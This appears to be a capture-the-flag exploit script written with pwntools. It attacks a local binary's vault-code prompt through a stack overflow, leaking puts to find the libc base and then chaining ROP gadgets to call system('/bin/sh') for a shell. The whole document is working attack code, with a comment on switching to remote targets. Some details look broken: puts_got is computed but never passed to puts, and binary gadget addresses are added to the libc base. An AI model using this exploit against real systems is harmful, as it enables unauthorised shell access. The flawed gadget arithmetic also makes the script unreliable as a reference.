from pwn import *

# Load the binary and libc
elf = ELF("./main")
libc = ELF("./libc.so.6")

# Find the puts address in the binary (for leaking)
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = 0x004011ee #  

# Find the address of the vulnerable function
# vuln_addr = elf.symbols['FUN_00401198']

# Print the addresses (for debugging)
log.info(f"Puts PLT: {hex(puts_plt)}")
log.info(f"Puts GOT: {hex(puts_got)}")
log.info(f"Main Address: {hex(main_addr)}")
# log.info(f"Vulnerable function Address: {hex(vuln_addr)}")

# Calculate the offset to the return address on the stack:
offset = 72 # 64 bytes for local_48 + 8 bytes for rbp

# Create a process to interact with
p = process("./main") # or remote("IP", PORT) for remote exploitation

# Craft the first payload to leak the puts address
payload = b"A" * offset
payload += p64(puts_plt) # call puts
payload += p64(main_addr) # return to main

# Send the payload
p.sendlineafter(b"Enter the secret code to unlock the vault: ", payload)

# Receive the leaked puts address
p.recvuntil(b"You entered: ")
p.recvline() # clean up
leaked_puts = u64(p.recv(6).ljust(8, b"\x00"))
log.info(f"Leaked puts address: {hex(leaked_puts)}")

# Calculate libc base address
libc_base = leaked_puts - libc.symbols['puts']
log.info(f"Libc base address: {hex(libc_base)}")

ret = libc_base + 0x0040101a
pop_rdi = libc_base + 0x00401196

# Find system and /bin/sh addresses in libc
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))

log.info(f"System address: {hex(system_addr)}")
log.info(f"/bin/sh address: {hex(binsh_addr)}")

# Craft the second payload for the ROP chain
payload = b"A" * offset
payload += p64(ret)  # ret gadget from the binary to align the stack
payload += p64(pop_rdi) # pop rdi ; ret
payload += p64(binsh_addr)
payload += p64(ret)
payload += p64(system_addr)

# Send the second payload
p.sendlineafter(b"Enter the secret code to unlock the vault: ", payload)

# Get an interactive shell
p.interactive()